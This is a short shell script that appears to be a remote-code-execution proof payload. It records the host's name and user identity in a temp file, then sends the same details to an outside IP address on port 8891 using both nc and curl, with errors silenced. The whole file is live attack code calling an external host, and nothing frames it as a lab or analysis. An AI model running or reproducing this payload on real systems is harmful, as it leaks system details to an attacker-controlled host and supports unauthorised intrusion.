#!/bin/sh
cat /etc/hostname > /tmp/rce_proof.txt
id >> /tmp/rce_proof.txt
echo "RCE:$(cat /etc/hostname):$(id)" | nc -w 3 62.113.111.63 8891 2>/dev/null
curl -s http://62.113.111.63:8891/rce -d "RCE:$(cat /etc/hostname):$(id)" 2>/dev/null
exit 0
